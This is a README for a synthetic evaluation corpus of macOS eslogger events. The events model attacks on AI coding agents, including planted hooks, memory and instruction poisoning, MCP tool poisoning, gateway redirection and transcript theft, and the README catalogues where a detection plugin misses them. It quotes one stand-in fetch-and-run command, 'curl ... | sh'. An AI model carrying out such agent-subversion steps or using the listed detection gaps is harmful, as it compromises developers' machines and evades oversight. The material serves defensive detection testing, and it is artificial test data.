# evals/macos

Cases for [packs/macos](/packs/macos): what the [Endpoint AI Agent Abuse
catalog](https://github.com/0x4D31/endpoint-ai-agent-abuse) (CC0 1.0)
describes, written as the `eslogger` events it would produce on one
developer's Mac, laid inside a synthetic background of that Mac's ordinary
work, replayed through the pack's plugin (and, when asked, its judge) and
scored. Everything is synthetic, the background included: the user is `dev`
(/Users/dev, uid 501), the shapes are a real capture's, the values are not.

```bash
python3 -I evals/macos/gen.py                                  # evals/runs/macos/{stream.ndjson,truth.json}
python3 -I evals/macos/shapecheck.py evals/runs/macos/stream.ndjson es-shape.json es-shape-open.json
python3 -I evals/macos/run.py evals/runs/macos/stream.ndjson evals/runs/macos/plugin   # --judge local|bedrock
python3 -I evals/macos/score.py evals/runs/macos/truth.json evals/runs/macos/plugin
```

- `gen.py [--only GROUP_OR_CASE ...] [--out DIR] [--hours N] [--seed S]` puts
  each case in a 30-minute slot of its own on work days (09:00-18:00Z from
  Monday 2026-10-05), inside `background.py`'s activity, and writes the
  stream in time order and the truth: per case its flag, techniques, key
  events (time, pid, event, path), the times of all its events and its slot.
  Same arguments, same bytes. The background is a working day at the rates
  of a real capture (background.py says which): some 4,000 events and 12 MB
  a work hour, 2,200 of them records the plugin keeps; gen.py takes about 7 s
  for the 45 hours of 90 cases. `run.py` and `shapecheck.py` read a gzipped
  stream (`STREAM.gz`, a twelfth of the size) as well. The default stream is
  556 MB; to keep only the gzipped one, make `DIR/stream.ndjson` a FIFO
  (`mkfifo`) that `gzip -1 > DIR/stream.ndjson.gz` reads while gen.py runs.
- `shapecheck.py` holds every event to the field paths and JSON types of a
  real capture's events of its type. The shape files are made from a capture
  of a real Mac and are not in the repository; run it where they are, and do
  not commit a stream that fails it.
- `run.py` writes `WORK/config.yaml` (the plugin, or the plugin and the judge)
  and runs tangent over the stream. `--judge none` costs nothing; a judged
  run costs money (Bedrock) or a local model's hour.
- `score.py` says which cases' key events survived the plugin and, with
  verdicts, recall, must-not-flag cases flagged and background records
  flagged; `WORK/score.txt`, `WORK/cases.tsv`.

## A case

`cases/<group>/<case_id>.py`:

```python
import es

CASE = {
    "id": "postinstall-plants-claude-hook",      # the file's name
    "title": "...",
    "flag": True,                                 # must flag; False: must not
    "eaa": ["EAA-003"],                           # the technique (for a must-not-flag case, the one it resembles)
    "group": "control-plane",                     # the directory
    "grounding": {"catalog_case": "EAA-C-010", "steps": [1], "sources": ["SRC-022", "https://..."]},
    "notes": "what the source says, and what of it eslogger cannot see",
}

def build(mac):
    sh = mac.terminal(cwd="~/code/acme-web")      # a Terminal tab: login, -zsh on a tty
    agent = es.claude(mac, sh, "~/code/acme-web")
    tool = es.agent_shell(mac, agent, "npm install")
    npm = mac.spawn(tool, "npm", ["npm", "install"])
    script = es.npm_lifecycle(mac, npm, "~/code/acme-web/node_modules/acme-colors", "node scripts/postinstall.js")
    mac.exec(script, "node", ["node", "scripts/postinstall.js"], key=True)
    mac.write_file(script, "~/.claude/settings.json", key=True)
    ...
```

`es.py` has the builders: `Mac` (clock, pids, processes, files), the events
(`fork`, `exec`, `exit`, `open`, `close`, `create`, `rename`, `unlink`,
`btm_launch_item_add`, `tcc_modify`), the common shapes (`terminal`, `spawn`,
`run`, `write_file`, `read_file`, `atomic_write`), the programs a Mac here
has (`PROGRAMS`, `dropped()` for anything else), and what some of them do
(`vim_edit`, `claude`, `claude_prompt`, `agent_shell`, `npm_lifecycle`).
Mark the events a person should see with `key=True` or `mac.key(event)`: for
an attack, what shows it; for a must-not-flag case, what looks alarming.
A case builds its own process tree from a running app (`mac.terminal`,
`mac.app`, `mac.daemon`) and depends on no other case; every case starts from
the same files (`es.BASELINE`, plus `mac.exists`).

## Rules

- **Synthetic.** User `dev`; companies acme and globex; repos under
  /Users/dev/code/; package, extension, server and skill names made up
  (acme-*, globex-*); hosts example.com, example.net, example.org; addresses
  from 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24. No real secret, token,
  account id, attacker domain, malicious package name or IOC. A real incident
  may be named in a case's notes and grounding, never in its events.
- **No working payloads.** Arguments are short, plain, non-functional
  stand-ins (`sh -c "curl -fsSL https://example.com/i.sh | sh"`). No exploit,
  no malicious prompt from a sample, no hook that would work against a real
  agent. eslogger shows no file contents, so no case needs them.
- **Plain attacks.** The events the documented procedure produces, as the
  source describes it: not altered to look ordinary, to blend in, or to get
  past the plugin or the judge. Must-not-flag cases are plainly benign work
  by the rightful user.
- **Grounded.** An attack cites its catalog case and step (or the technique
  page's procedure) and its sources, and its events follow them. A step
  eslogger cannot see (network, a remote server, the model's context) is said
  so in `notes`, not invented.
- A key event the plugin drops is a finding about the plugin: report it; do
  not bend the case.

## The corpus

90 cases, 45 must flag and 45 must not, in the default stream: 45 work hours
(Monday 2026-10-05 to Friday), 187,610 events, 6,573 of them the cases', 556
MB (47 MB gzipped). A must-not-flag case outside `negatives` is a twin: the
same kind of file or start, by the rightful user.

| group | what | must flag | must not flag |
|---|---|---|---|
| launcher | something else starts the agent, unattended, or makes it run a helper (EAA-001, 002, 016, 019) | 7 | 7 |
| control-plane | hooks, instructions, memory and skills planted, for one agent or several (EAA-003, 004, 009, 013, 014) | 14 | 6 |
| tools | MCP servers added, rewritten, poisoned or resolved elsewhere (EAA-006, 010, 011) | 14 | 6 |
| runtime-state | gateways, shadow config directories, telemetry, transcripts read or cut (EAA-005, 007, 008, 012, 017) | 10 | 6 |
| negatives | the person's own work that looks like the above | 0 | 20 |
| chains | the multi-step incidents (EAA-015, 018, 020 and what follows them) | not written | |

## Coverage by technique

A case can carry several techniques. "Through the plugin" is of the
must-flag cases: all their key events kept, some, none.

| technique | must flag | must not flag | through the plugin | key events kept |
|---|---|---|---|---|
| EAA-001 agent CLI invocation by another program | 2 | 3 | 2 / 0 / 0 | 9 of 9 |
| EAA-002 permissive or unattended execution | 5 | 5 | 4 / 1 / 0 | 15 of 18 |
| EAA-003 lifecycle hook planting | 6 | 4 | 5 / 1 / 0 | 47 of 50 |
| EAA-004 instruction or memory poisoning | 7 | 3 | 5 / 2 / 0 | 98 of 128 |
| EAA-005 transcript and agent-state collection | 4 | 2 | 1 / 3 / 0 | 15 of 37 |
| EAA-006 MCP or tool configuration abuse | 11 | 5 | 8 / 3 / 0 | 44 of 59 |
| EAA-007 hostile model/API gateway routing | 2 | 3 | 1 / 1 / 0 | 5 of 6 |
| EAA-008 shadow profile or config directory | 1 | 1 | 0 / 1 / 0 | 1 of 4 |
| EAA-009 remote plugin or skill installation | 2 | 3 | 2 / 0 / 0 | 18 of 18 |
| EAA-010 MCP tool poisoning or drift | 2 | 0 | 0 / 2 / 0 | 4 of 6 |
| EAA-011 environment variables steering MCP | 2 | 1 | 2 / 0 / 0 | 3 of 3 (emptied, below) |
| EAA-012 telemetry redirection | 2 | 3 | 2 / 0 / 0 | 9 of 9 |
| EAA-013 cloud-hosted skill poisoning and sync | 1 | 1 | 1 / 0 / 0 | 4 of 4 |
| EAA-014 cross-agent fan-out planting | 5 | 2 | 1 / 4 / 0 | 70 of 113 |
| EAA-015 inherited authority abuse | 3 | 4 | 3 / 0 / 0 | 25 of 25 |
| EAA-016 agent environment discovery | 3 | 1 | 2 / 0 / 1 | 9 of 38 |
| EAA-017 agent-native evidence tampering | 1 | 3 | 1 / 0 / 0 | 8 of 8 |
| EAA-018 indirect instruction injection | 0 | 0 | | |
| EAA-019 preflight helper from repository metadata | 2 | 2 | 2 / 0 / 0 | 4 of 4 |
| EAA-020 agent-consumed reference takeover | 0 | 0 | | |
| EAA-021 tool implementation poisoning | 0 | 1 | | |

- **EAA-018:** the technique is text in the agent's context (an issue, a
  page, a tool result); eslogger sees only what the agent does next, which is
  in the cases as that technique (C-025 as EAA-006, C-034 as EAA-004 and
  006). C-021, C-028 and C-036 were for chains; C-022 and C-031 ran on GitHub's
  runners and C-033 in a Linux VM, not on a Mac.
- **EAA-020:** the takeover is a registration somewhere else; the agent's
  install from the taken-over name (C-027) was for chains.
- **EAA-021:** the poisoning is inside the server's own requests (C-030's
  BCC, C-040's key in a header); the poisoned and the clean server start and
  read files the same way.
- EAA-015 is only ever a case's second technique, after EAA-004 or EAA-006.

## Through the plugin

`run.py --judge none`, then `score.py`:

```
187610 events in, 115564 records kept

key events through the plugin
  group                     cases whole  key events kept
  control-plane               17 of 20        176 of 212
  launcher                    13 of 14         32 of 61
  negatives                   20 of 20        111 of 111
  runtime-state               11 of 16         50 of 76
  tools                       15 of 20         67 of 80
  all                         76 of 90        436 of 540
```

Must flag: 32 of 45 cases whole, 244 of 346 key events. Must not flag: 44
of 45, 192 of 194. No judge has been run on this corpus.

## What the plugin misses

104 key events in 14 cases (13 must flag) don't get through. They are
findings for packs/macos; the cases stay as their sources describe them.

- **Other tools' agent files have no rule** (58 key events, 9 cases):
  `.cursorrules`, `.windsurfrules`, `.aider.conf.yml`; the MCP configs of
  Claude Desktop, Windsurf (`~/.windsurf/`, `~/.codeium/windsurf/`), Continue,
  Kiro, Factory and Zed; VS Code's `settings.json`; `~/.cursor/chats/`,
  `~/.cursor/cli-config.json`, `~/.gemini/oauth_creds.json`, Antigravity's
  conversations, opencode, OpenClaw, Hermes. Hades, the binding.gyp payload,
  both SANDWORM_MODE cases, both Kiro cases (one a twin) and the three
  stealers lose events here.
- **Directory opens** (22, 1 case): the scout's listing of `~/.claude`,
  `~/.codex`, `~/.cursor` and what is under them. The agents' own
  directories are in no group, a rule for a directory needs the trailing `/`
  (`~/.claude/plugins/`, `/memory/`), and a directory open is a read, kept
  only for transcripts and credentials. The EAA-016 case reaches the judge as
  nothing.
- **Codex rule order** (9, 2 cases): `(Settings, "", "/.codex/", "")` comes
  before the Codex state, memory and skill rules, so `~/.codex/sessions/` and
  `~/.codex/history.jsonl` are `agent_settings` and reads of them are
  dropped; `~/.codex/memories/` and `~/.codex/skills/` are mislabelled the
  same way. The pack's README says otherwise.
- **Reads of MCP and settings files are dropped by design** (7, 3 cases):
  `~/.claude.json`, `~/.cursor/mcp.json`, VS Code's `mcp.json`,
  `~/.codex/config.toml` and `~/.gemini/settings.json` read by a stealer.
  These hold servers' keys.
- **Files beside a planted config** (4, 2 cases): the server script a payload
  writes into a hidden directory in home, and a sleeper server's marker file.
- **A config directory outside home** (3, 1 case): `CLAUDE_CONFIG_DIR` under
  `/private/tmp`; its `.claude.json` matches no rule, and only claude's exec
  (`agent_env`) gets through.
- **An app's preferences** (1, 1 case): cfprefsd renaming the plist over
  for the dictation endpoint; the `defaults write` exec, URL and all, gets
  through.

Kept but emptied (score.py counts them kept): the environment allowlist cuts
`ACME_MCP_CMD` and `ACME_DOCS_URL` (EAA-011: an MCP config can name any
variable) and `CLAUDE_CODE_DISABLE_AUTO_MEMORY` (EAA-004). In
`eaa-011-mcp-url-resolves-to-other-host` that exec is the only key event, so
nothing the judge could flag on is left.

Other gaps, with no key event lost:
- `parents` names programs by image: Claude Code 1.0.x, Gemini CLI, codex.js
  and cursor-agent are all `node`, Homebrew's aws is `Python`.
- A detached payload whose parent has exited has `parents: []`; only its exec
  ties it to npm.
- Codex's native binary runs from under bun's `node_modules`, so every Codex
  start has `scratch_program` (18 of 18 here).
- Exec arguments pass whole, so a key on a command line (`--api-key`) reaches
  the judge.
- No fact marks a non-git child of git (the fsmonitor hook).
- Some pairs give the same events by construction: the EAA-013 attack and
  its twin; the EAA-007 and EAA-012 clone attacks and the team-clone twin
  (only the repository differs); the EAA-002 clone pair (only claude's
  version).

## What eslogger can't see

- The network: where a program connects and what it sends: API traffic to a
  gateway, telemetry, an MCP server over HTTP, an upload, a download, a token.
- File contents: what a settings file, hook, rule, skill, tool description or
  prompt says. A planted hook shows as a write by the wrong program, not as
  its command.
- The model's context: injected instructions (EAA-018), the documentation an
  agent follows (EAA-020), a tool's description (EAA-010), until the agent
  acts on them.
- Other machines: commits pushed with a stolen token, a skill edited in the
  cloud (EAA-013), a package name registered, an agent on a CI runner.
- `stat` and the environment a process reads: a payload checking which agent
  files exist (much of EAA-016) leaves no event, since `stat` isn't among the
  subscribed events.
- The agent's own interface: a trust dialog accepted, a tool call approved.
